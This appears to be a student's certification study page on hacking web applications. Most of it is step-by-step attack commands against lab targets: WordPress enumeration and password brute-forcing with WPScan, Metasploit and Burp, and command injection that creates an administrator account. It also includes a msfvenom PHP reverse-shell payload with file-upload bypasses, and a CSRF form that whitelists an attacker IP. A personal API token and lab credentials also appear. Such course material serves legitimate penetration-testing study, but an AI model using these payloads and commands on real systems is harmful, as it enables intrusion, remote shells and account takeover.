# 14 - Hacking Web Apps

#### <mark style="color:red;">**Module 14: Hacking Web Applications**</mark>

<details>

<summary>What is a Web App?</summary>

**Web App** is a software application that runs on web browsers over the internet. Unlike traditional desktop applications, web apps do not need to be installed on a user's device, and users can access them from various devices with internet connectivity and a compatible web browser. Web apps are designed to provide a wide range of functionalities and services, and they have become an integral part of modern online experiences.

Here are some key characteristics and features of web applications:

1. **Accessibility**: Web apps are accessible from any device with an internet connection and a web browser. This makes them platform-independent, as they can run on computers, smartphones, tablets, and other devices.
2. **No Installation**: Users do not need to download or install web apps on their devices. They can simply access them by navigating to a specific web address (URL).
3. **Client-Server Architecture**: Web apps typically follow a client-server architecture. The web browser on the client side interacts with a remote server that hosts the application's back-end logic and data.
4. **Interactivity**: Web apps can offer a wide range of interactive features, such as online shopping, social networking, email, collaboration tools, and more.
5. **Updates and Maintenance**: Updates and maintenance of web apps are typically handled on the server side. Users do not need to manually update the application on their devices.
6. **Cross-Platform Compatibility**: Web apps are designed to work across different operating systems and devices, as long as they have compatible web browsers.
7. **Responsive Design**: Many web apps incorporate responsive design techniques to adapt to various screen sizes and orientations, ensuring a good user experience on both desktop and mobile devices.
8. **Security**: Web app developers need to pay careful attention to security to protect user data and the application itself from various online threats.
9. **User Authentication**: Web apps often include user authentication and authorization features to control access to specific parts of the application or data.
10. **Dynamic Content**: Web apps can deliver dynamic content that changes based on user interactions, user input, or real-time data updates.

</details>

#### Wordpress

* wpscan --url http://10.10.10.12:8080 --enumerate u

#### WP password bruteforce

* msfconsole
* use auxiliary/scanner/http/wordpress\_login\_enum

#### RCE&#x20;

* ping 127.0.0.1 | hostname | net user

### **Perform a Brute-force Attack using Burp Suite**

* Set proxy for browser: 127.0.0.1:8080
* Burpsuite
* Type random credentials
* capture the request, right click-\&gt;send to Intrucder
* Intruder-\&gt;Positions
* Clear $
* Attack type: Cluster bomb
* select account and password value, Add $
* Payloads: Load wordlist file for set 1 and set 2
* start attack
* **filter status==302**
* open the raw, get the credentials
* recover proxy settings

{% content-ref url="../tools/burp-suite.md" %}
[burp-suite.md](../tools/burp-suite.md)
{% endcontent-ref %}

### **Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications**

* Log in a website, change the parameter value (id )in the URL
* Conduct a XSS attack: Submit script codes via text area

### **Enumerate and Hack a Web Application using WPScan and Metasploit**

* **wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url** [**http://10.10.10.16:8080/CEH**](http://10.10.10.16:8080/CEH) **--plugins-detection aggressive --enumerate u**
  * **--enumerate u: Specify the enumeration of users**
  * **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
  * **Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
* service postgresql start
* msfconsole
* **use auxiliary/scanner/http/wordpress\_login\_enum**
* show options
* **set PASS\_FILE password.txt**
* **set RHOST 10.10.10.16**
* **set RPORT 8080**
* **set TARGETURI** [**http://10.10.10.16:8080/CEH**](http://10.10.10.16:8080/CEH)
* **set USERNAME admin**
* run
* Find the credential, and use URL http://\[IP Address of Windows Server 2012]:8080/CEH/wp-login.php to login.

{% content-ref url="../tools/wpscan.md" %}
[wpscan.md](../tools/wpscan.md)
{% endcontent-ref %}

### **Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server (DVWA low level security)**

* If found command injection vulnerability in an input textfield
* \| hostname
* \| whoami
* **| tasklist| Taskkill /PID /F**
  * **/PID: Process ID value od the process**
  * **/F: Forcefully terminate the process**
* \| dir C:\\
* **| net user**
* **| net user user001 /Add**
* **| net user user001**
* **| net localgroup Administrators user001 /Add**
* Use created account user001 to log in remotely

### File Upload Vulnerability – All Levels DVWA

#### Payload Creation

* `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw` | create a raw php code
* Copy the code in a text file and save as .php

#### Low Level Exploitation

* Upload the file | note the path /dvwa/hackable/uploads/.php
* Run listener by starting msfconsole
* Type `use exploit/multi/handler`
* Type `set payload php/meterpreter/reverse_tcp`
* Type `set LHOST 10.10.10.11`
* Start listener, type exploit Browse link of file to start meterpreter session.

#### Medium Level Exploitation

* Rename file as .php.jpg
* While uploading, intercepting with burp and rename back to .php
* Run listener by starting msfconsole
* Type `use exploit/multi/handler`
* Type `set payload php/meterpreter/reverse_tcp`
* Type `set LHOST 10.10.10.11`
* Start listener, type `exploit`
* Browse link of file to start meterpreter session.

#### High Level Exploitation

* Open the .php file and add code GIF98 at start and save file as .jpg
* Upload file
* Now go to command execution tab and use command **\<Some IP>||copy C:\wamp64\www\DVWA\hackable\uploads\<filename>.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php**
* Run listener by starting msfconsole
* Type `use exploit/multi/handler`
* Type `set payload php/meterpreter/reverse_tcp`
* Type `set LHOST 10.10.10.11` Start listener, type `exploit`
* Browse link of file to start meterpreter session.

## Cross-Site Request Forgery (CSRF)

<details>

<summary>What is CSRF?</summary>

**Cross-Site Request Forgery** (CSRF) is a type of web security vulnerability and attack. In a CSRF attack:

1. Attackers trick users into unknowingly making malicious requests to a web application they're already authenticated on, often by embedding malicious code in a website, email, or other web content.
2. The victim's browser, while authenticated, sends the unauthorized request to the target web application without the user's consent.
3. The web application, unable to distinguish between legitimate and forged requests, processes the request as if it came from the authenticated user.
4. This can lead to actions like changing account settings or making financial transactions without the user's knowledge or consent.

</details>

Here below an example to exploit it.

* Open http://10.10.10.12:8080/CEH/wp-login.php | admin:qwerty@123
* Plugins -> Installed Plugins -> Firewall 2 -> Settings -> View Whitelisted IP
* Run command `wpscan -u http://10.10.10.12:8080/CEH --enumerate vp` | vp vulnerable plugins&#x20;
* Create a form with code
* Save as \<filename.html>

```html
<form method="POST" action="http://10.10.10.12:8080/CEH/wp-admin/options-general.php?
page=wordpress-firewall-2%2Fwordpress-firewall-2.php">
<script>alert("As an Admin, To enable additional security to your Website. Click Submit")</script>
<input type="hidden" name="whitelisted_ip[]" value="10.10.10.11" >
<input type="hidden" name="set_whitelist_ip" value="Set Whitelisted IPs" class="button-
secondary">
<input type="submit">
</form>
```

* Get victim to run it.

## Additional Resources

### Web Scanners

{% embed url="https://geekflare.com/nikto-webserver-scanner/" %}

{% embed url="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.htmlhttps://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/https://linuxhint.com/wpscan_wordpress_vulnerabilities_scan/" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/" %}

{% embed url="https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/" %}

#### YT videos

[https://www.youtube.com/watch?v=K78YOmbuT48](https://blog.clusterweb.com.br/?p=1297https://hackertarget.com/nikto-tutorial/https://geekflare.com/nikto-webserver-scanner/https://www.youtube.com/watch?v=K78YOmbuT48https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.htmlhttps://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/https://linuxhint.com/wpscan\_wordpress\_vulnerabilities\_scan/https://www.youtube.com/watch?v=SS991k5Alp0https://www.youtube.com/watch?v=MtyhOrBfG-Ehttps://www.youtube.com/watch?v=sQ4TtFdaiRAhttps://www.exploit-db.com/docs/english/45556-wordpress-penetration-testing-using-wpscan-and-metasploit.pdf?rsshttps://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/https://www.youtube.com/watch?v=BTGP5sZfJKYhttps://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/)[\
\
https://www.youtube.com/watch?v=SS991k5Alp0\
\
https://www.youtube.com/watch?v=MtyhOrBfG-E\
\
https://www.youtube.com/watch?v=sQ4TtFdaiRA\
\
https://www.youtube.com/watch?v=BTGP5sZfJKY](https://blog.clusterweb.com.br/?p=1297https://hackertarget.com/nikto-tutorial/https://geekflare.com/nikto-webserver-scanner/https://www.youtube.com/watch?v=K78YOmbuT48https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.htmlhttps://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/https://linuxhint.com/wpscan\_wordpress\_vulnerabilities\_scan/https://www.youtube.com/watch?v=SS991k5Alp0https://www.youtube.com/watch?v=MtyhOrBfG-Ehttps://www.youtube.com/watch?v=sQ4TtFdaiRAhttps://www.exploit-db.com/docs/english/45556-wordpress-penetration-testing-using-wpscan-and-metasploit.pdf?rsshttps://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/https://www.youtube.com/watch?v=BTGP5sZfJKYhttps://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/)
